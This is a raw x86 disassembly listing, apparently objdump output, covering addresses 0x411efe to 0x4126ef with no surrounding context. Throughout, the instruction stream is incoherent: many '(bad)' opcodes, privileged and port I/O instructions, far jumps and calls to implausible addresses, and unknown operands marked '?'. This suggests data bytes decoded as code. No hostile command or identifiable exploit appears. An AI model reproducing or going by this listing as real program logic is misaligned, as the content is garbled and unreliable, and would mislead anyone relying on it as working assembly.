  411efe:	jmp    DWORD PTR [ebp+0x2]
  411f01:	add    BYTE PTR ds:0xe5b012ba,ch
  411f07:	mov    dl,0x3f
  411f09:	pop    ds
  411f0a:	or     dh,BYTE PTR [edx-0x2008fbf9]
  411f10:	jle    0x411f77
  411f12:	jp     0x411f21
  411f14:	(bad)  
  411f15:	sahf   
  411f16:	into   
  411f17:	cli    
  411f18:	jmp    0x411e9b
  411f1a:	ror    BYTE PTR [esi+0x65265607],0x48
  411f21:	retf   0xeb79
  411f24:	cmc    
  411f25:	jmp    0x44412066
  411f2a:	jae    0x411f1a
  411f2c:	mov    dh,0xc1
  411f2e:	dec    edi
  411f2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f30:	mov    eax,ds:0x40e7bf6c
  411f35:	pop    edx
  411f36:	fimul  WORD PTR [ebx+0x78ca7a1b]
  411f3c:	fisttp DWORD PTR [ebp-0x4f]
  411f3f:	mov    edi,0x27b1c757
  411f44:	push   ds
  411f45:	xchg   ebx,eax
  411f46:	idiv   BYTE PTR [edi+0x13]
  411f49:	add    al,0x76
  411f4b:	std    
  411f4c:	push   0xffffffff
  411f4e:	loopne 0x411f91
  411f50:	sub    ecx,DWORD PTR [ebx+eiz*8+0x1b2f35f0]
  411f57:	ins    BYTE PTR es:[edi],dx
  411f58:	mov    edx,0xdad8d782
  411f5d:	enter  0xc3,0x5
  411f61:	pop    edi
  411f62:	pop    edi
  411f63:	sbb    eax,edx
  411f65:	jns    0x411f0c
  411f67:	rcl    ebx,0x43
  411f6a:	clc    
  411f6b:	xchg   BYTE PTR [eax],ah
  411f6d:	pop    edi
  411f6e:	adc    DWORD PTR [ecx+0x33821dc8],ecx
  411f74:	aas    
  411f75:	pop    ebp
  411f76:	cmp    ah,BYTE PTR [ebp+0x76]
  411f79:	sbb    eax,0xfa104faf
  411f7e:	iret   
  411f7f:	xchg   edx,eax
  411f80:	xchg   edx,eax
  411f81:	jg     0x411fda
  411f83:	fistp  QWORD PTR [edi]
  411f85:	js     0x411f96
  411f87:	push   es
  411f88:	adc    bl,0x74
  411f8b:	aad    0xf0
  411f8d:	jno    0x411f59
  411f8f:	adc    ecx,DWORD PTR [edx]
  411f91:	dec    esi
  411f92:	jp     0x411f56
  411f94:	loope  0x411fc5
  411f96:	stos   DWORD PTR es:[edi],eax
  411f97:	dec    edi
  411f98:	popf   
  411f99:	add    DWORD PTR [ebx+0x2c],ecx
  411f9c:	or     edx,esp
  411f9e:	call   0xdcffcdc
  411fa3:	add    DWORD PTR [eiz*4-0x5f729d9a],0xf
  411fab:	es cdq 
  411fad:	jmp    0xcf46:0x72800617
  411fb4:	clc    
  411fb5:	jno    0x411f47
  411fb7:	or     eax,0xf4f00372
  411fbc:	clc    
  411fbd:	(bad)  
  411fbe:	mov    esi,0x1c677ebf
  411fc3:	mov    esp,0xf4b4c1e5
  411fc8:	mov    bh,0xf4
  411fca:	sbb    eax,0xc478337f
  411fcf:	sbb    eax,0x439e1d61
  411fd4:	adc    DWORD PTR [edi-0x39],0x47dd3e7b
  411fdb:	and    eax,DWORD PTR [edi-0x7f]
  411fde:	mov    bh,0x47
  411fe0:	pop    ds
  411fe1:	xchg   esp,eax
  411fe2:	cli    
  411fe3:	jae    0x412064
  411fe5:	or     cl,BYTE PTR [ebx]
  411fe7:	inc    ebx
  411fe8:	inc    ecx
  411fe9:	in     al,0xd
  411feb:	mov    eax,0xf9f6b092
  411ff0:	pop    ss
  411ff1:	push   cs
  411ff2:	mov    WORD PTR [edi],ds
  411ff4:	xor    bh,BYTE PTR [ebx]
  411ff6:	loop   0x41200f
  411ff8:	out    dx,eax
  411ff9:	dec    esi
  411ffa:	xor    BYTE PTR [edi+eax*8-0x3a],0xf
  411fff:	es jo  0x412062
  412002:	cwde   
  412003:	(bad)  
  412005:	std    
  412006:	jae    0x411feb
  412008:	repnz pop ebx
  41200a:	push   ds
  41200b:	sub    al,0x32
  41200d:	mov    esp,0x97f1a188
  412012:	adc    bh,BYTE PTR [esi+0x25]
  412015:	mov    ds:0x275e166f,eax
  41201a:	add    BYTE PTR [eax-0x25],bl
  41201d:	pop    es
  41201e:	add    BYTE PTR [edi-0x47c9a387],bh
  412024:	adc    ah,BYTE PTR ds:0x27a8c769
  41202a:	lock pop eax
  41202c:	push   ecx
  41202d:	mov    ebp,0x104fdebf
  412032:	ror    BYTE PTR [edi+0x2a],0x1d
  412036:	(bad)  
  412037:	test   eax,0x4f1da44f
  41203c:	mov    bh,0x5c
  41203e:	repnz div DWORD PTR [ecx-0x5b28031a]
  412045:	inc    ebx
  412046:	inc    edi
  412047:	icebp  
  412048:	lods   al,BYTE PTR ds:[esi]
  412049:	cmp    eax,0xe9498304
  41204e:	dec    esi
  41204f:	jmp    FWORD PTR [ecx+edx*8]
  412052:	inc    eax
  412053:	sbb    al,0x1e
  412055:	mov    dl,0xec
  412057:	mov    esp,0xfba2c727
  41205c:	jle    0x41206f
  41205e:	or     ecx,DWORD PTR [esi-0x39359681]
  412064:	bound  edi,QWORD PTR [edi]
  412066:	rol    BYTE PTR [edx+0x5b4e3f79],0x89
  41206d:	adc    DWORD PTR [edx],eax
  41206f:	and    dh,dh
  412071:	xor    DWORD PTR [bx+di],0xf8decbc1
  412078:	cdq    
  412079:	mov    ebp,0x17abd271
  41207e:	(bad)  
  41207f:	rcl    ch,cl
  412081:	dec    edi
  412082:	dec    esi
  412083:	or     DWORD PTR [ecx],ebp
  412085:	add    BYTE PTR [edx],0x40
  412088:	add    cl,BYTE PTR [ecx]
  41208a:	ss adc al,0x64
  41208d:	pop    edx
  41208e:	outs   dx,DWORD PTR ds:[esi]
  41208f:	jl     0x412064
  412091:	daa    
  412092:	xor    esp,esp
  412094:	add    al,0x5d
  412096:	inc    esp
  412097:	add    DWORD PTR [edx],esp
  412099:	fistp  QWORD PTR [esi-0xb]
  41209c:	fbld   TBYTE PTR [esi+0x35ccc96d]
  4120a2:	loopne 0x4120d9
  4120a4:	xchg   esi,eax
  4120a5:	sbb    BYTE PTR [ecx+0x1f],dl
  4120a8:	push   cs
  4120a9:	daa    
  4120aa:	shl    DWORD PTR [esi],0x64
  4120ad:	add    BYTE PTR [ebx],dl
  4120af:	es lahf 
  4120b1:	sbb    DWORD PTR [ebp-0x1c],edi
  4120b4:	or     BYTE PTR [eax+0x7f76e9fc],dl
  4120ba:	sbb    ch,cl
  4120bc:	jg     0x412139
  4120be:	and    al,0x3a
  4120c0:	das    
  4120c1:	cwde   
  4120c2:	adc    ebx,DWORD PTR [ebp+0x764e676b]
  4120c8:	pop    ebp
  4120c9:	jb     0x41208d
  4120cb:	shl    ebx,cl
  4120cd:	mov    dh,0x6b
  4120cf:	scas   eax,DWORD PTR es:[edi]
  4120d0:	dec    esp
  4120d1:	(bad)  
  4120d2:	sub    eax,0x1450c0e3
  4120d7:	test   BYTE PTR ds:0xfd0d9a78,dl
  4120dd:	inc    edi
  4120de:	(bad)  
  4120df:	sbb    ecx,DWORD PTR [edi+eax*1+0x2560f5]
  4120e6:	test   DWORD PTR [ebx-0xa40f0ff],ebp
  4120ec:	jns    0x41215f
  4120ee:	out    0x3f,eax
  4120f0:	pop    edi
  4120f1:	pop    ds
  4120f2:	fstp   TBYTE PTR [ebx+0x54424ba3]
  4120f8:	or     dl,BYTE PTR [ebp+0x14]
  4120fb:	dec    edi
  4120fc:	(bad)  
  4120fe:	xor    DWORD PTR [edx],ebx
  412100:	sti    
  412101:	mov    ebx,0xd043ab81
  412106:	push   ebp
  412107:	add    BYTE PTR [edx],al
  412109:	test   BYTE PTR [esi+0x27fd9a10],al
  41210f:	add    BYTE PTR [ecx+edi*8-0x8961640],ch
  412116:	daa    
  412117:	rcr    BYTE PTR [eax+0x6123338f],0x86
  41211e:	cvtdq2pd xmm5,xmm7
  412122:	pop    ecx
  412123:	xchg   esp,eax
  412124:	mov    WORD PTR [edi],ds
  412126:	aas    
  412127:	sahf   
  412128:	sub    DWORD PTR [ebp-0x45fd750],0x4f138278
  412132:	mov    edi,0xc7ecc8e1
  412137:	mov    ebp,0xe878c1e2
  41213c:	into   
  41213d:	xor    eax,0xc48ffa03
  412142:	and    bh,cl
  412144:	sahf   
  412145:	les    esi,FWORD PTR [ebx+0x60e6a015]
  41214b:	mov    WORD PTR [esi+esi*4-0x3f],cs
  41214f:	pusha  
  412150:	out    dx,eax
  412151:	jmp    0x8f48:0x75649bdc
  412158:	in     al,0xcd
  41215a:	jnp    0x41213d
  41215c:	dec    ebx
  41215d:	ror    esi,cl
  41215f:	dec    edi
  412160:	sbb    al,0xbd
  412162:	mov    ?,WORD PTR [esi-0x33a8e81]
  412168:	clc    
  412169:	push   DWORD PTR [esi]
  41216b:	jg     0x412192
  41216d:	jmp    0x24391787
  412172:	add    al,0x78
  412174:	lock lahf 
  412176:	sbb    ebx,DWORD PTR ds:[ebx+0x58edf33f]
  41217d:	mov    cl,0x78
  41217f:	push   esi
  412180:	sbb    al,0xfe
  412182:	mov    ds:0x43a5a6af,eax
  412187:	call   0xd810aa6
  41218c:	sbb    al,0x20
  41218e:	xor    DWORD PTR [esi],0xffffffd9
  412191:	push   ss
  412192:	fbstp  TBYTE PTR [ebx-0x53eea610]
  412198:	push   cs
  412199:	loopne 0x4121e7
  41219b:	or     BYTE PTR [eax+0x3d8aca00],al
  4121a1:	jnp    0x412175
  4121a3:	mov    esi,0x84030504
  4121a8:	mov    ds:0x9c18f757,al
  4121ad:	jp     0x412215
  4121af:	push   0xb9af4bd9
  4121b4:	cmp    BYTE PTR [ecx],bh
  4121b6:	shr    DWORD PTR [esi-0x71],0xa5
  4121ba:	loop   0x4121fd
  4121bc:	mov    al,0x7
  4121be:	ds mov ecx,0xf1fc7e31
  4121c4:	outs   dx,DWORD PTR ds:[esi]
  4121c5:	(bad)  
  4121c6:	in     al,dx
  4121c7:	arpl   ax,dx
  4121c9:	jo     0x412179
  4121cb:	cs int3 
  4121cd:	lahf   
  4121ce:	into   
  4121cf:	mov    bh,0x3a
  4121d1:	pause  
  4121d3:	imul   eax,DWORD PTR [edi+0x72],0x0
  4121d7:	stos   DWORD PTR es:[edi],eax
  4121d8:	sub    al,0x9
  4121da:	clc    
  4121db:	push   0x5e2741f4
  4121e0:	adc    edx,DWORD PTR [eax]
  4121e2:	sub    eax,0x67223ca9
  4121e7:	push   cs
  4121e8:	sahf   
  4121e9:	cmp    al,0x6c
  4121eb:	leave  
  4121ec:	cmc    
  4121ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121ee:	lea    eax,[eax]
  4121f0:	and    DWORD PTR [ebx-0xb2a0d42],0x1f9213d4
  4121fa:	mov    bh,0x7c
  4121fc:	std    
  4121fd:	dec    ebp
  4121fe:	imul   eax,DWORD PTR [ebx+0x5],0x3b1b0040
  412205:	mov    al,0x21
  412207:	or     BYTE PTR [esi],bl
  412209:	add    bh,BYTE PTR [edi-0x72088fd1]
  41220f:	imul   edx,DWORD PTR [edx+0x3c],0x75
  412213:	les    edi,FWORD PTR [ecx]
  412215:	ja     0x4121db
  412217:	add    esi,DWORD PTR [edi+0x3f]
  41221a:	and    eax,0xd9c32d1
  41221f:	add    bh,cl
  412221:	pushf  
  412222:	cli    
  412223:	rol    DWORD PTR [edi],cl
  412225:	add    DWORD PTR [eax],ebx
  412227:	aas    
  412228:	mov    esp,0xdc0bce2f
  41222d:	repnz lods eax,DWORD PTR ds:[esi]
  41222f:	pop    ds
  412230:	daa    
  412231:	inc    ebx
  412232:	add    DWORD PTR [ecx],0x2e
  412235:	jl     0x4121f9
  412237:	adc    eax,DWORD PTR [edi]
  412239:	std    
  41223a:	add    DWORD PTR [ebx],eax
  41223c:	inc    eax
  41223d:	loope  0x4121ce
  41223f:	sub    ebp,DWORD PTR [eax-0x2f32b710]
  412245:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412246:	ins    DWORD PTR es:[edi],dx
  412247:	mov    edi,0x5d5a58fd
  41224c:	inc    eax
  41224d:	add    ebp,edx
  41224f:	(bad)  
  412250:	push   ds
  412251:	add    edx,DWORD PTR [edi+eiz*1+0x7185f2be]
  412258:	jmp    DWORD PTR [esi-0x41b0d861]
  41225e:	call   0xc668b9ef
  412263:	add    DWORD PTR [esi-0x7f],esp
  412266:	add    ch,BYTE PTR [edx]
  412268:	pminsw mm1,mm3
  41226b:	in     eax,0x3e
  41226d:	xchg   esi,eax
  41226e:	jns    0x41221b
  412270:	jmp    FWORD PTR [eax]
  412272:	jns    0x4122f3
  412274:	cmp    al,0xec
  412276:	jae    0x4122c0
  412278:	(bad)  
  412279:	or     eax,0xcc00010
  41227e:	shr    BYTE PTR [eax],0x90
  412281:	xadd   BYTE PTR [ecx],bh
  412284:	neg    DWORD PTR [eax+0x26]
  412287:	dec    edx
  412288:	cdq    
  412289:	jecxz  0x4122fe
  41228b:	dec    esi
  41228c:	dec    esi
  41228d:	dec    ecx
  41228e:	ret    
  41228f:	push   ebp
  412290:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412291:	mov    edi,0xfa118132
  412296:	xor    DWORD PTR [ebx-0x17394920],0x49
  41229d:	mov    al,0x4a
  41229f:	adc    DWORD PTR [ebp-0x22],esi
  4122a2:	adc    al,0xf9
  4122a4:	jge    0x4122d9
  4122a6:	or     BYTE PTR ds:0x74fb3741,dl
  4122ac:	in     al,dx
  4122ad:	repz mov dh,0xfc
  4122b0:	xlat   BYTE PTR ds:[ebx]
  4122b1:	fmul   QWORD PTR [esi-0x3c]
  4122b4:	xor    dh,ch
  4122b6:	out    0x5c,eax
  4122b8:	loop   0x412274
  4122ba:	arpl   WORD PTR [esi+0x3b1a7e78],bp
  4122c0:	imul   eax,esp
  4122c3:	sbb    DWORD PTR [eax],eax
  4122c5:	fsubr  DWORD PTR [ebx]
  4122c7:	(bad)  
  4122c8:	jcxz   0x41228c
  4122cb:	or     dl,BYTE PTR [eax+0x492fc705]
  4122d1:	xor    ebp,ecx
  4122d3:	xchg   DWORD PTR [edi],esp
  4122d5:	inc    esi
  4122d6:	adc    edi,edi
  4122d8:	ret    
  4122d9:	jmp    0x41234a
  4122db:	mov    edi,0xad38b6e1
  4122e0:	out    0x69,eax
  4122e2:	out    0x1d,eax
  4122e4:	jge    0x412361
  4122e6:	sbb    al,0xb8
  4122e8:	jl     0x41234f
  4122ea:	fdivr  QWORD PTR [ebp-0x4]
  4122ed:	mov    ds:0xf24eefc1,al
  4122f2:	inc    ecx
  4122f3:	sbb    edx,DWORD PTR [esi+eax*4]
  4122f6:	test   BYTE PTR [eax-0x14],bh
  4122f9:	mov    dh,0x7a
  4122fb:	icebp  
  4122fc:	int3   
  4122fd:	mov    bl,0x20
  4122ff:	add    BYTE PTR [eax],al
  412301:	sub    al,0xdb
  412303:	ror    ebx,0xef
  412306:	clc    
  412307:	lock inc edi
  412309:	push   es
  41230a:	lods   al,BYTE PTR ds:[esi]
  41230b:	push   cs
  41230c:	inc    edi
  41230d:	lods   al,BYTE PTR ds:[esi]
  41230e:	arpl   WORD PTR [ebx+0x38],bx
  412311:	jbe    0x41236d
  412313:	jb     0x4122ae
  412315:	lock (bad) 
  412318:	mov    ebp,0x7757e221
  41231d:	(bad)  
  41231e:	fisub  WORD PTR [edi-0x61]
  412321:	adc    bh,al
  412323:	jge    0x412319
  412325:	lahf   
  412326:	adc    edi,ebp
  412328:	(bad)  
  412329:	sub    DWORD PTR [edi-0x28],edx
  41232c:	dec    ebx
  41232d:	mov    al,0x75
  41232f:	push   0xffffff98
  412331:	aad    0x27
  412333:	call   0x1844e4e0
  412338:	mov    eax,0x41cdc7d4
  41233d:	mov    eax,0x5090e0f
  412342:	or     al,0x15
  412344:	xchg   esp,esp
  412346:	je     0x412332
  412348:	pop    ds
  412349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41234a:	pushf  
  41234b:	push   ss
  41234c:	or     dh,BYTE PTR [ebx]
  41234e:	sti    
  41234f:	xlat   BYTE PTR ds:[ebx]
  412350:	cs pop edx
  412352:	aas    
  412353:	bound  ebp,QWORD PTR [ebx+0x27]
  412356:	test   DWORD PTR [ecx],0xce146c00
  41235c:	call   0x653b92dc
  412361:	xor    DWORD PTR [edi-0x2e9e712d],ebp
  412367:	cmp    DWORD PTR [edx-0x1d],esi
  41236a:	xlat   BYTE PTR ds:[ebx]
  41236b:	push   edx
  41236c:	dec    edx
  41236d:	loopne 0x412319
  41236f:	mov    bl,0xcf
  412371:	add    al,al
  412373:	xchg   ebx,eax
  412374:	push   es
  412375:	dec    esi
  412376:	and    eax,ebx
  412378:	mov    al,ds:0xbefa8cc7
  41237d:	xchg   esp,eax
  41237e:	push   ebp
  41237f:	(bad)  
  412380:	jmp    0x4123b6
  412382:	das    
  412383:	mov    al,ds:0x810047cb
  412388:	jmp    0x8e33:0x3c18dffb
  41238f:	mov    bl,0xcf
  412391:	adc    BYTE PTR [edi-0x4024d9df],ch
  412397:	repz pop ss
  412399:	dec    ecx
  41239a:	cmp    eax,esi
  41239c:	int3   
  41239d:	aaa    
  41239e:	sahf   
  41239f:	and    al,0xe4
  4123a1:	ds push 0xffffffc4
  4123a4:	into   
  4123a5:	pop    es
  4123a6:	xlat   BYTE PTR ds:[ebx]
  4123a7:	mov    ebp,0x85ad3d22
  4123ac:	add    ah,bl
  4123ae:	and    DWORD PTR [ecx-0x2348072e],0x74
  4123b5:	(bad)  
  4123b6:	and    BYTE PTR [ebx+0xf],bh
  4123b9:	add    eax,DWORD PTR [ebx+0x1]
  4123bc:	fld    QWORD PTR [esi]
  4123be:	sub    BYTE PTR [eax-0x3d543ff7],al
  4123c4:	mov    al,ds:0xfeb06ed2
  4123c9:	dec    edx
  4123ca:	add    bl,bh
  4123cc:	mov    edi,0x159fd7b8
  4123d1:	pop    edi
  4123d2:	(bad)  
  4123d3:	push   0x592044a
  4123d8:	mov    al,ds:0xf60c005e
  4123dd:	pop    ss
  4123de:	cmp    dl,0x63
  4123e1:	inc    ebx
  4123e2:	or     esi,DWORD PTR [edx+0xe]
  4123e5:	or     al,0x4b
  4123e7:	jo     0x412425
  4123e9:	cmp    DWORD PTR [ecx],ebx
  4123eb:	or     BYTE PTR [esi+0x20],dl
  4123ee:	(bad)  
  4123ef:	leave  
  4123f0:	cld    
  4123f1:	fs in  al,dx
  4123f3:	cmp    BYTE PTR [ebp+0x8],dl
  4123f6:	add    eax,0xdb107e9b
  4123fb:	arpl   WORD PTR [edi+0x1],bx
  4123fe:	cli    
  4123ff:	test   ebx,edi
  412401:	push   ecx
  412402:	adc    BYTE PTR [edx+0xe109c00],ah
  412408:	loopne 0x41247d
  41240a:	mov    WORD PTR [ecx],fs
  41240c:	aad    0xf9
  41240e:	xchg   ecx,eax
  41240f:	das    
  412410:	(bad)  
  412411:	out    dx,al
  412412:	mov    bh,0x9f
  412414:	xchg   ecx,eax
  412415:	scas   al,BYTE PTR es:[edi]
  412416:	inc    ecx
  412417:	cs loopne 0x4123da
  41241a:	lds    ebx,FWORD PTR [ebx+0x2e2bf162]
  412420:	mov    esi,es
  412422:	xor    DWORD PTR [edi-0x73],ecx
  412425:	imul   ecx,DWORD PTR [esi],0xffffff8c
  412428:	call   DWORD PTR ds:0xdd8c5ad8
  41242e:	mov    ebp,0xcf8003bb
  412433:	mov    bl,0x7a
  412435:	jns    0x412484
  412437:	push   ds
  412438:	push   edx
  412439:	jno    0x4124b7
  41243b:	push   edi
  41243c:	mov    al,ds:0x15aaff1b
  412441:	mov    bl,0xe2
  412443:	ror    bh,1
  412445:	dec    esi
  412446:	(bad)  
  412447:	mov    dl,0x67
  412449:	int3   
  41244a:	cmp    al,0xbe
  41244c:	mov    WORD PTR [ebp+0x23fec82c],cs
  412452:	neg    BYTE PTR [edi+0x731d5add]
  412458:	dec    edi
  412459:	pop    edi
  41245a:	sbb    dh,BYTE PTR [edi]
  41245c:	pop    ebp
  41245d:	hlt    
  41245e:	ret    
  41245f:	hlt    
  412460:	sbb    eax,0x303b7
  412465:	xchg   edx,eax
  412466:	mov    eax,ds:0xa70041f6
  41246b:	inc    ebp
  41246c:	jecxz  0x4124e5
  41246e:	and    edx,DWORD PTR [eax+0x0]
  412471:	xchg   BYTE PTR [eax+0x2e],bh
  412474:	add    al,0x61
  412476:	pop    ss
  412477:	fs xor eax,0xffffff88
  41247b:	jnp    0x41246a
  41247d:	adc    ebx,edi
  41247f:	arpl   WORD PTR [ecx],di
  412481:	jo     0x412458
  412483:	pop    ecx
  412484:	jae    0x412459
  412486:	dec    edi
  412487:	shl    DWORD PTR [ecx],1
  412489:	icebp  
  41248a:	fwait
  41248b:	xchg   edx,eax
  41248c:	enter  0xddbf,0x1f
  412490:	fistp  DWORD PTR [esi-0x7]
  412493:	out    dx,al
  412494:	hlt    
  412495:	or     al,bh
  412497:	hlt    
  412498:	xor    ecx,DWORD PTR [edi-0x78]
  41249b:	pop    ss
  41249c:	pop    ebp
  41249d:	hlt    
  41249e:	iret   
  41249f:	jno    0x412490
  4124a1:	in     eax,dx
  4124a2:	call   DWORD PTR [edx+0x47e08ff6]
  4124a8:	pop    ebx
  4124a9:	mov    al,0xa
  4124ab:	test   bh,ch
  4124ad:	out    0xcf,eax
  4124af:	fst    DWORD PTR [ebx]
  4124b1:	pop    es
  4124b2:	aas    
  4124b3:	sti    
  4124b4:	retf   0x8799
  4124b7:	xlat   BYTE PTR ds:[ebx]
  4124b8:	out    dx,al
  4124b9:	stc    
  4124ba:	fisub  WORD PTR [eax-0x31]
  4124bd:	aas    
  4124be:	iret   
  4124bf:	cld    
  4124c0:	add    ebx,DWORD PTR [ebx]
  4124c2:	shl    BYTE PTR [edx],0x20
  4124c5:	ss div eax
  4124c8:	cmp    eax,0x4f490372
  4124cd:	cli    
  4124ce:	retf   
  4124cf:	mov    ebx,0x7f860204
  4124d4:	fsubr  QWORD PTR [ecx-0x5a7f98f6]
  4124da:	jmp    0x609b:0x52f3cd6a
  4124e1:	outs   dx,DWORD PTR ds:[esi]
  4124e2:	out    dx,eax
  4124e3:	in     eax,dx
  4124e4:	push   ecx
  4124e5:	push   DWORD PTR [ebx-0x3b]
  4124e8:	mov    gs,WORD PTR [eax+0x33]
  4124eb:	sbb    edi,DWORD PTR [edx-0x32]
  4124ee:	lods   eax,DWORD PTR es:[esi]
  4124f0:	dec    edx
  4124f1:	hlt    
  4124f2:	ret    0x6f92
  4124f5:	hlt    
  4124f6:	ret    0x2c00
  4124f9:	pushf  
  4124fa:	xor    dh,BYTE PTR [esi+edx*8-0x4420a45b]
  412501:	mov    eax,ds:0xe0c97d31
  412506:	(bad)  
  412507:	mov    cl,0x2
  412509:	mov    ebp,0xe3008537
  41250e:	mov    WORD PTR [ecx-0x302beb6c],?
  412514:	popf   
  412515:	sub    ch,BYTE PTR [edx+0x1ee14582]
  41251b:	jmp    DWORD PTR [ebx]
  41251d:	add    BYTE PTR [edx+edx*4-0x271dcafe],dh
  412524:	mov    bl,0x97
  412526:	(bad)  
  412527:	arpl   WORD PTR [edi+0x801b5f1],di
  41252d:	loopne 0x412543
  41252f:	adc    al,0x1c
  412531:	inc    ecx
  412532:	(bad)  
  412533:	fld    TBYTE PTR [edi+0x4fbfaccf]
  412539:	ins    BYTE PTR es:[edi],dx
  41253a:	js     0x4125a8
  41253c:	push   esp
  41253d:	das    
  41253e:	cmp    edi,DWORD PTR [edi]
  412540:	in     eax,dx
  412541:	adc    al,ah
  412543:	xor    DWORD PTR [ebx+0x78],esp
  412546:	(bad)  
  412547:	and    BYTE PTR [ecx],bl
  412549:	shl    BYTE PTR [esi-0x6073f111],1
  41254f:	imul   esi,ebp,0x50
  412552:	xchg   esi,eax
  412553:	cmp    ecx,DWORD PTR [esi-0x44f1dd48]
  412559:	loope  0x4124e7
  41255b:	pop    eax
  41255c:	(bad)  
  41255d:	mov    eax,0x86291d26
  412562:	pop    edi
  412563:	sahf   
  412564:	loope  0x41251c
  412566:	loope  0x4124fc
  412568:	pop    esp
  412569:	pop    ebx
  41256a:	jns    0x4125ad
  41256c:	xor    ch,BYTE PTR [esi+0x24]
  41256f:	cli    
  412570:	outs   dx,BYTE PTR ds:[esi]
  412571:	pop    esp
  412572:	jne    0x4125ea
  412574:	push   edx
  412575:	sbb    ch,ch
  412577:	xor    esi,DWORD PTR [esi-0x75]
  41257a:	mov    eax,ds:0x2ff33b60
  41257f:	mov    edi,0xd144c2f8
  412584:	jmp    0x13721786
  412589:	add    BYTE PTR ds:0xbad8824b,0x8c
  412590:	out    0x1c,eax
  412592:	js     0x412602
  412594:	popa   
  412595:	sbb    ch,BYTE PTR [edi-0x61]
  412598:	xchg   ecx,eax
  412599:	push   0x12bb1002
  41259e:	out    0xde,eax
  4125a0:	imul   ecx
  4125a2:	add    al,0x40
  4125a4:	call   0xf45c32ac
  4125a9:	cwde   
  4125aa:	sbb    eax,DWORD PTR [eax+eiz*4-0x14]
  4125ae:	fmul   DWORD PTR [ebx]
  4125b0:	lock enter 0x7b61,0x53
  4125b5:	mov    BYTE PTR [edx+0x34e045f6],dl
  4125bb:	int3   
  4125bc:	push   ds
  4125bd:	cwde   
  4125be:	and    BYTE PTR [ecx],bl
  4125c0:	mov    BYTE PTR [edi-0x56],al
  4125c3:	iret   
  4125c4:	pop    esp
  4125c5:	(bad)  
  4125c6:	sahf   
  4125c7:	clc    
  4125c8:	inc    esi
  4125c9:	rep ins DWORD PTR es:[edi],dx
  4125cb:	add    ebp,DWORD PTR [edi+0x5fafdd3c]
  4125d1:	adc    eax,DWORD PTR [ebp-0x62]
  4125d4:	pop    ss
  4125d5:	sar    BYTE PTR [ebp+ecx*1+0x59],1
  4125d9:	sbb    BYTE PTR [ebp+0x3255f79b],cl
  4125df:	jbe    0x41259e
  4125e1:	(bad)  
  4125e2:	cmp    eax,0xfbe7ef08
  4125e7:	dec    edx
  4125e8:	add    al,ah
  4125ea:	call   0x8cdfc45e
  4125ef:	pop    ds
  4125f0:	paddw  mm4,QWORD PTR [eax-0x9]
  4125f4:	sbb    ebp,DWORD PTR [eax]
  4125f6:	aas    
  4125f7:	retf   0xfe81
  4125fa:	(bad)  
  4125fb:	sub    BYTE PTR [esi+eax*1],ah
  4125fe:	fistp  DWORD PTR [edi]
  412600:	call   0xc804:0x125e874e
  412607:	add    al,0xf0
  412609:	lahf   
  41260a:	pop    es
  41260b:	fs loopne 0x4125a6
  41260e:	ins    BYTE PTR es:[edi],dx
  41260f:	ins    BYTE PTR es:[edi],dx
  412610:	shufps xmm6,XMMWORD PTR [esi+0x702d68],0x58
  412618:	inc    bl
  41261a:	scas   eax,DWORD PTR es:[edi]
  41261b:	in     eax,dx
  41261c:	mov    al,ds:0xb1e3e7e0
  412621:	xchg   esp,eax
  412622:	mov    BYTE PTR [edx-0xc],dh
  412625:	or     esp,DWORD PTR [edi-0x72]
  412628:	push   edi
  412629:	out    0x5e,eax
  41262b:	pmuludq mm1,QWORD PTR ds:0x6f89ffde
  412632:	cli    
  412633:	push   0xba38f0f2
  412638:	sub    eax,0x5fc5c001
  41263d:	mov    bl,BYTE PTR ds:0x1c64ff6f
  412643:	cmc    
  412644:	stos   BYTE PTR es:[edi],al
  412645:	lds    ebp,FWORD PTR [ecx]
  412647:	xor    DWORD PTR [esp+eax*4+0x1f86f770],ecx
  41264e:	inc    esi
  41264f:	jecxz  0x412635
  412651:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412652:	(bad)  
  412654:	mov    ds:0xd061a8d1,eax
  412659:	cmp    al,0xf5
  41265b:	call   0x5b65:0xbbe03ae7
  412662:	mov    dh,0xa5
  412664:	dec    ebp
  412665:	dec    esp
  412666:	cmp    al,0xf7
  412668:	jg     0x412649
  41266a:	mov    esp,0x2fe6c1c9
  41266f:	cmp    al,0xf7
  412671:	mov    cl,0x7d
  412673:	ror    esp,1
  412675:	mov    eax,0xe11c1db1
  41267a:	in     eax,dx
  41267b:	fisubr WORD PTR [ebp-0x11]
  41267e:	mov    ebx,ebp
  412680:	dec    esi
  412681:	clc    
  412682:	jbe    0x41263a
  412684:	fs retf 
  412686:	jns    0x412682
  412688:	mov    bl,0x3b
  41268a:	jg     0x41261e
  41268c:	cli    
  41268d:	je     0x412674
  41268f:	fld    TBYTE PTR [edi]
  412691:	mov    cl,BYTE PTR [ebp-0x1264223]
  412697:	mov    WORD PTR [esi-0x14251144],?
  41269d:	xchg   esi,eax
  41269e:	enter  0xed45,0x54
  4126a2:	out    0xdb,eax
  4126a4:	cmp    DWORD PTR [ebx+0x64],0x592ac01f
  4126ab:	push   es
  4126ac:	sub    al,0xad
  4126ae:	adc    DWORD PTR [edi-0x74],eax
  4126b1:	add    al,BYTE PTR [edx+0x14]
  4126b4:	mov    WORD PTR ds:0x7c28daec,?
  4126ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126bb:	retf   
  4126bc:	push   eax
  4126bd:	retf   0x1402
  4126c0:	or     dh,dl
  4126c2:	cmc    
  4126c3:	cmp    al,0xc8
  4126c5:	repnz iret 
  4126c7:	jl     0x4126f1
  4126c9:	sbb    bl,BYTE PTR [ebx]
  4126cb:	push   cs
  4126cc:	(bad)  
  4126cd:	mov    esi,0xfe63abdd
  4126d2:	loop   0x4126a1
  4126d4:	jmp    0xedd73118
  4126d9:	clc    
  4126da:	ins    BYTE PTR es:[edi],dx
  4126db:	rcr    DWORD PTR [ebp+edi*4-0x1514b061],0xf8
  4126e3:	outs   dx,BYTE PTR ds:[esi]
  4126e4:	out    0x1d,eax
  4126e6:	lahf   
  4126e7:	dec    esi
  4126e8:	ffreep st(3)
  4126ea:	loopne 0x4126d7
  4126ec:	xlat   BYTE PTR ds:[ebx]
  4126ed:	sub    al,0x48
  4126ef:	addr16 add eax,esi
